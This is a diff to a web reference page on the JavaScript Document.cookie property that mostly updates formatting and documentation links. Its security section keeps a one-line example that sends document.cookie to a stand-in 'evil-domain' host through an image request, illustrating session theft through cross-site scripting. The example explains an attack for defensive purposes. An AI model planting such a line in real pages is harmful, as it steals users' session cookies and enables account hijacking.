@@ -2,14 +2,14 @@
 title: Document.cookie
 slug: Web/API/Document/cookie
 tags:
-- API
-- Document
-- HTML DOM
-- JS
-- NeedsMarkupWork
-- Reference
-- Storage
-- cookie
+  - API
+  - Document
+  - HTML DOM
+  - JS
+  - NeedsMarkupWork
+  - Reference
+  - Storage
+  - cookie
 ---
 <div>{{APIRef("DOM")}}</div>
 
@@ -90,14 +90,14 @@ tags:
 				over secure protocol as https. Before Chrome 52, this flag could appear
 				with cookies from http domains.</li>
 			<li id="new-cookie_samesite"><code>;samesite</code> <a
-					href="/en-US/docs/Web/HTTP/Cookies#SameSite_cookies">SameSite</a>
+					href="/en-US/docs/Web/HTTP/Cookies#samesite_cookies">SameSite</a>
 				prevents the browser from sending this cookie along with cross-site
 				requests. Possible values are <code>lax</code>,
 				<code>strict</code> or <code>none</code>.
 				<ul>
 					<li>The <code>lax</code> value will send the cookie for all same-site
 						requests and top-level navigation GET requests. This is sufficient
-						for user tracking, but it will prevent many CSRF attacks. This is
+            for user tracking, but it will prevent many <a href="/en-US/docs/Glossary/CSRF" >Cross-Site Request Forgery</a> (CSRF) attacks. This is
 						the default value in modern browsers.</li>
 					<li>The <code>strict</code> value will prevent the cookie from being
 						sent by the browser to the target site in all cross-site browsing
@@ -134,10 +134,10 @@ tags:
 
 <div class="note"><strong>Note:</strong> As you can see from the code above,
 	<code>document.cookie</code> is an <a
-		href="/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#Description">accessor
+		href="/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description">accessor
 		property</a> with native <em>setter</em> and <em>getter</em> functions, and
 	consequently is <em>not</em> a <a
-		href="/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#Description">data
+		href="/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description">data
 		property</a> with a value: what you write is not the same as what you read,
 	everything is always mediated by the JavaScript interpreter.</div>
 
@@ -249,12 +249,12 @@ if (document.cookie.split(';').some((item) =&gt; item.includes('reader=1'))) {
 	element with the path of the cookie, then accessing this iframe's
 	<code>contentDocument.cookie</code> property. The only way to protect the cookie is by
 	using a different domain or subdomain, due to the <a
-		href="/en-US/docs/Same_origin_policy_for_JavaScript">same origin policy</a>.</p>
+		href="/en-US/docs/Web/Security/Same-origin_policy">same origin policy</a>.</p>
 
-<p>Cookies are often used in web application to identify a user and their authenticated
-	session. So stealing the cookie from a web application, will lead to hijacking the
-	authenticated user's session. Common ways to steal cookies include using Social
-	Engineering or by exploiting an XSS vulnerability in the application -</p>
+<p>Cookies are often used in web applications to identify a user and their authenticated
+	session. Stealing a cookie from a web application leads to hijacking the
+	authenticated user's session. Common ways to steal cookies include using <a href="https://en.wikipedia.org/wiki/Social_engineering_(security)">social
+  engineering</a> or by exploiting a <a href="/en-US/docs/Glossary/Cross-site_scripting">cross-site scripting</a> (XSS) vulnerability in the application -</p>
 
 <pre class="brush: js">(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 </pre>
@@ -269,12 +269,12 @@ if (document.cookie.split(';').some((item) =&gt; item.includes('reader=1'))) {
 
 <ul>
 	<li>Starting with Firefox 2, a better mechanism for client-side storage is available -
-		<a href="/en-US/docs/DOM/Storage">WHATWG DOM Storage</a>.</li>
+		<a href="/en-US/docs/Web/API/Web_Storage_API">WHATWG DOM Storage</a>.</li>
 	<li>You can delete a cookie by updating its expiration time to zero.</li>
 	<li>Keep in mind that the more cookies you have, the more data will be transferred
 		between the server and the client for each request. This will make each request
 		slower. It is highly recommended for you to use <a
-			href="/en-US/docs/DOM/Storage">WHATWG DOM Storage</a> if you are going to keep
+			href="/en-US/docs/Web/API/Web_Storage_API">WHATWG DOM Storage</a> if you are going to keep
 		"client-only" data.</li>
 	<li><a href="http://www.ietf.org/rfc/rfc2965.txt">RFC 2965</a> (Section 5.3,
 		"Implementation Limits") specifies that there should be <strong>no maximum
@@ -287,7 +287,7 @@ if (document.cookie.split(';').some((item) =&gt; item.includes('reader=1'))) {
 <p>The reason for the <a href="#syntax">syntax</a> of the <code>document.cookie</code>
 	accessor property is due to the client-server nature of cookies, which differs from
 	other client-client storage methods (like, for instance, <a
-		href="/en-US/docs/Web/Guide/API/DOM/Storage">localStorage</a>):</p>
+		href="/en-US/docs/Web/API/Web_Storage_API">localStorage</a>):</p>
 
 <h4 id="The_server_tells_the_client_to_store_a_cookie">The server tells the client to
 	store a cookie</h4>
@@ -340,10 +340,10 @@ Accept: */*
 
 <ul>
 	<li><a href="/en-US/docs/Web/HTTP/Cookies">HTTP cookies</a></li>
-	<li><a href="/en-US/docs/Web/Guide/API/DOM/Storage">DOM Storage</a></li>
+	<li><a href="/en-US/docs/Web/API/Web_Storage_API">DOM Storage</a></li>
 	<li><a href="/en-US/docs/Web/API/URLUtils.pathname"><code>URLUtils.pathname</code></a>
 	</li>
 	<li>{{jsxref("Date.toUTCString()")}}</li>
 	<li><a href="/ja/docs/Web/HTTP"><code>HTTP</code></a></li>
-	<li><a href="https://tools.ietf.org/html/rfc2965">RFC 2965</a></li>
+	<li><a href="https://datatracker.ietf.org/doc/html/rfc2965">RFC 2965</a></li>
 </ul>
